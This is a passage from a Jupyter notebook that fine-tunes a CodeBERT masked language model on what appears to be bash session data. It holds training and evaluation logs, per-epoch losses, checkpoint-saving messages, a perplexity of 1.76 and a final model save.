      "/home/det_user/mboffa/envs/cuda/lib/python3.10/site-packages/transformers/optimization.py:306: FutureWarning: This implementation of AdamW is deprecated and will be removed in a future version. Use the PyTorch implementation torch.optim.AdamW instead, or set `no_deprecation_warning=True` to disable this warning\n",
      "  warnings.warn(\n",
      "***** Running training *****\n",
      "  Num examples = 31865\n",
      "  Num Epochs = 5\n",
      "  Instantaneous batch size per device = 16\n",
      "  Total train batch size (w. parallel, distributed & accumulation) = 16\n",
      "  Gradient Accumulation steps = 1\n",
      "  Total optimization steps = 9960\n",
      "  Number of trainable parameters = 124697433\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "\n",
       "    <div>\n",
       "      \n",
       "      <progress value='9960' max='9960' style='width:300px; height:20px; vertical-align: middle;'></progress>\n",
       "      [9960/9960 23:59, Epoch 5/5]\n",
       "    </div>\n",
       "    <table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       " <tr style=\"text-align: left;\">\n",
       "      <th>Epoch</th>\n",
       "      <th>Training Loss</th>\n",
       "      <th>Validation Loss</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <td>1</td>\n",
       "      <td>0.859600</td>\n",
       "      <td>0.852938</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>2</td>\n",
       "      <td>0.647500</td>\n",
       "      <td>0.680905</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>3</td>\n",
       "      <td>0.560900</td>\n",
       "      <td>0.607771</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>4</td>\n",
       "      <td>0.513600</td>\n",
       "      <td>0.575645</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <td>5</td>\n",
       "      <td>0.515100</td>\n",
       "      <td>0.566897</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table><p>"
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "The following columns in the evaluation set don't have a corresponding argument in `RobertaForMaskedLM.forward` and have been ignored: word_ids. If word_ids are not expected by `RobertaForMaskedLM.forward`,  you can safely ignore this message.\n",
      "***** Running Evaluation *****\n",
      "  Num examples = 4594\n",
      "  Batch size = 16\n",
      "Saving model checkpoint to /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-1992\n",
      "Configuration saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-1992/config.json\n",
      "Model weights saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-1992/pytorch_model.bin\n",
      "tokenizer config file saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-1992/tokenizer_config.json\n",
      "Special tokens file saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-1992/special_tokens_map.json\n",
      "Deleting older checkpoint [/share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-9960] due to args.save_total_limit\n",
      "The following columns in the evaluation set don't have a corresponding argument in `RobertaForMaskedLM.forward` and have been ignored: word_ids. If word_ids are not expected by `RobertaForMaskedLM.forward`,  you can safely ignore this message.\n",
      "***** Running Evaluation *****\n",
      "  Num examples = 4594\n",
      "  Batch size = 16\n",
      "Saving model checkpoint to /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-3984\n",
      "Configuration saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-3984/config.json\n",
      "Model weights saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-3984/pytorch_model.bin\n",
      "tokenizer config file saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-3984/tokenizer_config.json\n",
      "Special tokens file saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-3984/special_tokens_map.json\n",
      "Deleting older checkpoint [/share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-1992] due to args.save_total_limit\n",
      "The following columns in the evaluation set don't have a corresponding argument in `RobertaForMaskedLM.forward` and have been ignored: word_ids. If word_ids are not expected by `RobertaForMaskedLM.forward`,  you can safely ignore this message.\n",
      "***** Running Evaluation *****\n",
      "  Num examples = 4594\n",
      "  Batch size = 16\n",
      "Saving model checkpoint to /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-5976\n",
      "Configuration saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-5976/config.json\n",
      "Model weights saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-5976/pytorch_model.bin\n",
      "tokenizer config file saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-5976/tokenizer_config.json\n",
      "Special tokens file saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-5976/special_tokens_map.json\n",
      "Deleting older checkpoint [/share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-3984] due to args.save_total_limit\n",
      "The following columns in the evaluation set don't have a corresponding argument in `RobertaForMaskedLM.forward` and have been ignored: word_ids. If word_ids are not expected by `RobertaForMaskedLM.forward`,  you can safely ignore this message.\n",
      "***** Running Evaluation *****\n",
      "  Num examples = 4594\n",
      "  Batch size = 16\n",
      "Saving model checkpoint to /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-7968\n",
      "Configuration saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-7968/config.json\n",
      "Model weights saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-7968/pytorch_model.bin\n",
      "tokenizer config file saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-7968/tokenizer_config.json\n",
      "Special tokens file saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-7968/special_tokens_map.json\n",
      "Deleting older checkpoint [/share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-5976] due to args.save_total_limit\n",
      "The following columns in the evaluation set don't have a corresponding argument in `RobertaForMaskedLM.forward` and have been ignored: word_ids. If word_ids are not expected by `RobertaForMaskedLM.forward`,  you can safely ignore this message.\n",
      "***** Running Evaluation *****\n",
      "  Num examples = 4594\n",
      "  Batch size = 16\n",
      "Saving model checkpoint to /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-9960\n",
      "Configuration saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-9960/config.json\n",
      "Model weights saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-9960/pytorch_model.bin\n",
      "tokenizer config file saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-9960/tokenizer_config.json\n",
      "Special tokens file saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-9960/special_tokens_map.json\n",
      "Deleting older checkpoint [/share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-7968] due to args.save_total_limit\n",
      "\n",
      "\n",
      "Training completed. Do not forget to share your model on huggingface.co/models =)\n",
      "\n",
      "\n",
      "Loading best model from /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/checkpoint-9960 (score: 0.5668972730636597).\n"
     ]
    },
    {
     "data": {
      "text/plain": [
       "TrainOutput(global_step=9960, training_loss=0.7048988158444324, metrics={'train_runtime': 1439.6097, 'train_samples_per_second': 110.672, 'train_steps_per_second': 6.919, 'total_flos': 2.09723849698176e+16, 'train_loss': 0.7048988158444324, 'epoch': 5.0})"
      ]
     },
     "execution_count": 34,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "trainer.train()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7312d871-b902-4fb3-9a68-bfba904f1a07",
   "metadata": {},
   "source": [
    "### After training"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 35,
   "id": "81c732ac-0ce8-449c-9257-69a47d0f08f8",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "The following columns in the evaluation set don't have a corresponding argument in `RobertaForMaskedLM.forward` and have been ignored: word_ids. If word_ids are not expected by `RobertaForMaskedLM.forward`,  you can safely ignore this message.\n",
      "***** Running Evaluation *****\n",
      "  Num examples = 4594\n",
      "  Batch size = 16\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "\n",
       "    <div>\n",
       "      \n",
       "      <progress value='288' max='288' style='width:300px; height:20px; vertical-align: middle;'></progress>\n",
       "      [288/288 00:10]\n",
       "    </div>\n",
       "    "
      ],
      "text/plain": [
       "<IPython.core.display.HTML object>"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      ">>> Perplexity: 1.76\n"
     ]
    }
   ],
   "source": [
    "eval_results = trainer.evaluate()\n",
    "print(f\">>> Perplexity: {math.exp(eval_results['eval_loss']):.2f}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "82753f08",
   "metadata": {},
   "source": [
    "### Saving model"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 36,
   "id": "906d6d35",
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "Saving model checkpoint to /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/\n",
      "Configuration saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/config.json\n",
      "Model weights saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/pytorch_model.bin\n",
      "tokenizer config file saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/tokenizer_config.json\n",
      "Special tokens file saved in /share/smartdata/huawei/Sessions_representations/sessions-representation/Finetuned_models/codebert-base_bash_finetuned/tokenizer_pretrained_epochs_5_padded_256/special_tokens_map.json\n"
     ]
    }
   ],
   "source": [
    "trainer.save_model() # Model will be available at the output_dir folder"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python [conda env:mboffa-cuda]",
   "language": "python",
   "name": "conda-env-mboffa-cuda-py"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
